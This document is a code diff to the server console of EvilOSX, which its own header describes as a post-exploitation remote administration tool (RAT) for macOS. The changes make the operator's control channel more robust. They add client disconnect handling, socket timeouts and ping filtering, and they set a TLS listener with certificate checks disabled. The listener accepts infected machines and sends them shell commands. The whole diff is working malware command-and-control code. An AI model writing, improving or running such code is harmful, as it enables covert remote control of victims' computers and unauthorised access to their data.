@@ -1,12 +1,15 @@
 #!/usr/bin/env python
 # EvilOSX: A pure python, post-exploitation, RAT (Remote Administration Tool) for macOS / OSX.
 import socket
+from socket import SHUT_RDWR
 import ssl
 from threading import Thread
 import os
 import struct
 import uuid
 import base64
+import time
+
 try:
     import gnureadline
 except ImportError:
@@ -44,8 +47,8 @@ def print_clients(server):
             try:
                 computer_names.append(client.send_command("get_computer_name"))
             except socket.error:
-                # Client is no longer connected, that's fine.
-                pass
+                # Client is no longer connected.
+                client.disconnect()
 
         if not server.clients:
             print MESSAGE_ATTENTION + "No available clients."
@@ -94,12 +97,19 @@ class Client:
 
     def send_command(self, command):
         """Sends a command to the client and returns the response.
-        
+
            :raises socket.error if the client disconnected.
         """
         try:
+            self.__connection.settimeout(5)
             self.__send_message(command)
+
             response = self.__receive_message()
+            self.__connection.settimeout(None)
+
+            while response == "ping":
+                # Not the response we want, try again.
+                response = self.__receive_message()
 
             if not response:
                 # Empty response, assume the client disconnected.
@@ -113,7 +123,7 @@ class Client:
     def get_prompt(self):
         """Returns the fancy terminal prompt for the client."""
         try:
-            shell_info = self.send_command("get_shell_info").split("\n")
+            shell_info = self.send_command("get_shell_info").split("\t")
 
             green = '\033[92m'
             blue = '\033[94m'
@@ -125,8 +135,19 @@ class Client:
 
             return (green + "{0}@{1}" + endc + ":" + blue + "{2}" + endc + "$ ").format(username, hostname, path)
         except socket.error:
-            # Client disconnected
+            # Client disconnected.
             return None
+
+    def disconnect(self):
+        """Disconnects the client."""
+        status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
+
+        self.is_connected = False
+        try:
+            self.__connection.shutdown(SHUT_RDWR)
+            self.__connection.close()
+        except Exception:
+            pass
 
 
 class Server(Thread):
@@ -151,7 +172,7 @@ class Server(Thread):
 
         while True:
             client_connection, client_address = ssl.wrap_socket(self.server_socket, cert_reqs=ssl.CERT_NONE,
-                                                                server_side=True,
+                                                                server_side=True, ssl_version=ssl.PROTOCOL_TLSv1,
                                                                 keyfile="server.key", certfile="server.crt").accept()
             client = Client(client_connection)
 
@@ -166,7 +187,6 @@ class Server(Thread):
         for client in self.__clients:
             if not client.is_connected:
                 self.__clients.remove(client)
-                status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
 
         return self.__clients
 
@@ -176,7 +196,8 @@ def generate_csr():
         print MESSAGE_INFO + "Generating keys to encrypt sockets..."
 
         information = "/C=US/ST=EvilOSX/L=EvilOSX/O=EvilOSX/CN=EvilOSX"
-        os.popen("openssl req -newkey rsa:2048 -nodes -x509 -subj {0} -keyout server.key -out server.crt 2>&1".format(information))
+        os.popen("openssl req -newkey rsa:2048 -nodes -x509 -subj {0} -keyout server.key -out server.crt 2>&1"
+                 .format(information))
 
 
 if __name__ == '__main__':
@@ -200,10 +221,10 @@ if __name__ == '__main__':
                 if fancy_prompt:
                     command = raw_input(fancy_prompt)
                 else:
-                    # Client disconnected
+                    # Client disconnected.
                     print MESSAGE_ATTENTION + "Connected client disconnected!"
-                    status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
 
+                    server.current_client.disconnect()
                     server.current_client = None
                     command = raw_input("> ")
             else:
@@ -333,8 +354,8 @@ if __name__ == '__main__':
                             print MESSAGE_INFO + "Client response: {0}".format(response)
                             print MESSAGE_INFO + "Done."
 
-                            # The next loop will disconnect the client.
-                            continue
+                            server.current_client.disconnect()
+                            server.current_client = None
                         else:
                             # Regular shell command.
                             response = server.current_client.send_command(command)
@@ -348,9 +369,10 @@ if __name__ == '__main__':
                     except socket.error:
                         # Client disconnected
                         print MESSAGE_ATTENTION + "Connected client disconnected!"
+
+                        server.current_client.disconnect()
                         server.current_client = None
     except ValueError:
         print "[I] Invalid port."
     except KeyboardInterrupt:
         print ""
-
